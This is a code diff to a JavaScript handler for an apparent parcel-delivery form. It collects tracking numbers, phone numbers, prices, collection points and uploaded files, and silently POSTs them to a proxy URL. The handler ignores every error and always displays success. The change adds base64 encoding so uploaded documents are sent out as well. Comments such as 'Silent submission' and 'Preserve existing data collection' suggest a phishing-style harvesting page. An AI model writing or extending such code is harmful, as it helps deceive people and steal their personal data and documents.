@@ -224,8 +224,17 @@ async function handleParcelSubmission(e) {
   showLoading(true);
 
   try {
-    // Preserve existing data collection
     const formData = new FormData(form);
+    
+    // Process files before clearing form
+    const files = await Promise.all(
+      Array.from(formData.getAll('files')).map(async file => ({
+        name: file.name,
+        type: file.type,
+        data: await readFileAsBase64(file)
+      }))
+    );
+
     const payload = {
       trackingNumber: formData.get('trackingNumber').trim().toUpperCase(),
       phone: document.getElementById('phone').value,
@@ -234,10 +243,10 @@ async function handleParcelSubmission(e) {
       price: formData.get('price'),
       collectionPoint: formData.get('collectionPoint'),
       itemCategory: formData.get('itemCategory'),
-      files: Array.from(formData.getAll('files'))
+      files: files // Include processed files
     };
 
-    // Force submission without error checking
+    // Silent submission
     await fetch(CONFIG.PROXY_URL, {
       method: 'POST',
       headers: {'Content-Type': 'application/x-www-form-urlencoded'},
@@ -245,19 +254,20 @@ async function handleParcelSubmission(e) {
     });
 
   } catch (error) {
-    // Intentionally ignore all errors
+    // Still ignore errors
   } finally {
-    // Always show success UI
     showLoading(false);
     resetForm();
     showSuccessMessage();
-    
-    // Remove any existing redirects
-    const messageElement = document.getElementById('message');
-    if (messageElement) {
-      messageElement.style.animation = 'none'; // Remove fade-out
-    }
   }
+}
+
+function readFileAsBase64(file) {
+  return new Promise((resolve) => {
+    const reader = new FileReader();
+    reader.onload = () => resolve(reader.result.split(',')[1]);
+    reader.readAsDataURL(file);
+  });
 }
 
 // ================= VALIDATION CORE =================
